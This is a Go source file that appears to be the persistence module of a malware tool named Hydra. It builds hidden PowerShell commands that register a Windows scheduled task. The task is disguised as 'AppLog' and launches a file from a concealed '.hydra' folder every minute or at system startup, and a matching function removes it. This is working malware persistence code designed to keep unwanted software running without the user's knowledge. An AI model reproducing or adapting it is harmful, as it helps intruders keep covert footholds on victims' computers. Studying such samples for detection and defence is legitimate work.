package install

import (
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"syscall"

	"github.com/Raffy27/Hydra/util"
)

const (
	addTaskCmd1 = "$p='%s';$a=New-ScheduledTaskAction -E ($p+(gci -Pa $p -File -Fo)[0].Name);"
	minTrigger  = "$t=New-ScheduledTaskTrigger -RepetitionI (New-TimeSpan -M 1) -O -At (Date);"
	maxTrigger  = "$t=New-ScheduledTaskTrigger -AtStartup;"
	addTaskCmd2 = "Register-ScheduledTask -Ac $a -Tr $t -TaskN '%s' -D '%s'"
	remTaskCmd  = "Unregister-ScheduledTask -TaskN '%s' -Co:$false"
)

//TryTaskInstall attempts to establish persistence by creating a scheduled task.
func TryTaskInstall() error {
	pscmd := fmt.Sprintf(addTaskCmd1, "C:/Users/Raffy/Saved Games/.hydra/")
	if util.RunningAsAdmin() {
		pscmd += maxTrigger
	} else {
		pscmd += minTrigger
	}
	pscmd += fmt.Sprintf(addTaskCmd2, "AppLog", "This is a description.")

	cmd := exec.Command("powershell", pscmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()

	if strings.Contains(string(out), "FullyQualifiedErrorId") {
		return errors.New("Failed to create task")
	}
	return err
}

//UninstallTask removes the scheduled task entry created by the install procedure.
func UninstallTask() error {
	cmd := exec.Command("powershell", fmt.Sprintf(remTaskCmd, "AppLog"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()

	if strings.Contains(string(out), "FullyQualifiedErrorId") {
		return errors.New("Failed to create task")
	}
	return err
}
